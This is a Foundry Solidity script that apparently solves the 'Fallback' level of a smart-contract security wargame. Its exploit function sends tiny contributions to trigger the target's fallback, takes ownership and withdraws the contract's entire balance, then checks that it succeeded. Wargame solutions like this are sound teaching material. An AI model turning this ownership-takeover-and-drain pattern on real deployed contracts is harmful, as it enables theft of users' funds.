pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Fallback} from "../src/Level01.sol";

contract Level01Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));
        Fallback target = Fallback(contractAddress);

        vm.startBroadcast(wallet.privateKey);
        exploit(target);
        vm.stopBroadcast();

        require(levelDone(target, wallet.addr), "Solution failed");
    }

    function exploit(Fallback target) private {
        target.contribute{value: 1 wei}();
        (bool ok,) = address(target).call{value: 1 wei}("");
        require(ok, "could not send funds to contract");
        target.withdraw();
    }

    function levelDone(Fallback target, address attacker) private view returns (bool) {
        return 
            target.owner() == attacker
            && address(target).balance == 0;
    }
}
